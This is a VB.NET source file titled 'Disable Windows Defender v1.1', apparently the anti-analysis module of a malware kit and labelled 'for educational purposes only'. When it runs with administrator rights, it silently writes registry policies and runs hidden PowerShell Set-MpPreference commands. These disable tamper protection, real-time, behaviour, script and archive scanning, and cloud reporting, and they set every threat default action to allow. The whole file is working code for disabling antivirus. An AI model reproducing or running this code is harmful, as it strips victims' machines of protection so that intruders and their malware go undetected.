Imports System
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Security.Principal

Namespace Antis
    '---------------------------------------------------------
    '│ Author     : NYAN CAT
    '│ Name       : Disable Windows Defender v1.1
    '│ Contact    : https://github.com/NYAN-x-CAT
    '---------------------------------------------------------
    'This program is distributed for educational purposes only. 
    Class DisableWD
        Public Sub Start()
            Dim t As New Threading.Thread(AddressOf DisableWD)
            t.IsBackground = True
            t.Start()
        End Sub
        Private Shared Sub DisableWD()
            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
                RegistryEdit("SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0")
                RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1")
                RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1")
                RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1")
                RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1")
                CheckDefender()
            End If
        End Sub

        Private Shared Sub RegistryEdit(ByVal regPath As String, ByVal name As String, ByVal value As String)
            Try

                Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree)

                    If key Is Nothing Then
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord)
                        Return
                    End If

                    If key.GetValue(name) <> CObj(value) Then key.SetValue(name, value, RegistryValueKind.DWord)
                End Using

            Catch
            End Try
        End Sub

        Private Shared Sub CheckDefender()
            Dim proc As Process = New Process With {
                .StartInfo = New ProcessStartInfo With {
                    .FileName = "powershell",
                    .Arguments = "Get-MpPreference -verbose",
                    .UseShellExecute = False,
                    .RedirectStandardOutput = True,
                    .WindowStyle = ProcessWindowStyle.Hidden,
                    .CreateNoWindow = True
                }
            }
            proc.Start()

            While Not proc.StandardOutput.EndOfStream
                Dim line As String = proc.StandardOutput.ReadLine()

                If line.StartsWith("DisableRealtimeMonitoring") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true")
                ElseIf line.StartsWith("DisableBehaviorMonitoring") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true")
                ElseIf line.StartsWith("DisableBlockAtFirstSeen") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true")
                ElseIf line.StartsWith("DisableIOAVProtection") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableIOAVProtection $true")
                ElseIf line.StartsWith("DisablePrivacyMode") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisablePrivacyMode $true")
                ElseIf line.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true")
                ElseIf line.StartsWith("DisableArchiveScanning") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableArchiveScanning $true")
                ElseIf line.StartsWith("DisableIntrusionPreventionSystem") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true")
                ElseIf line.StartsWith("DisableScriptScanning") AndAlso line.EndsWith("False") Then
                    RunPS("Set-MpPreference -DisableScriptScanning $true")
                ElseIf line.StartsWith("SubmitSamplesConsent") AndAlso Not line.EndsWith("2") Then
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2")
                ElseIf line.StartsWith("MAPSReporting") AndAlso Not line.EndsWith("0") Then
                    RunPS("Set-MpPreference -MAPSReporting 0")
                ElseIf line.StartsWith("HighThreatDefaultAction") AndAlso Not line.EndsWith("6") Then
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force")
                ElseIf line.StartsWith("ModerateThreatDefaultAction") AndAlso Not line.EndsWith("6") Then
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6")
                ElseIf line.StartsWith("LowThreatDefaultAction") AndAlso Not line.EndsWith("6") Then
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6")
                ElseIf line.StartsWith("SevereThreatDefaultAction") AndAlso Not line.EndsWith("6") Then
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6")
                End If
            End While
        End Sub

        Private Shared Sub RunPS(ByVal args As String)
            Dim proc As Process = New Process With {
                .StartInfo = New ProcessStartInfo With {
                    .FileName = "powershell",
                    .Arguments = args,
                    .WindowStyle = ProcessWindowStyle.Hidden,
                    .CreateNoWindow = True
                }
            }
            proc.Start()
        End Sub
    End Class
End Namespace
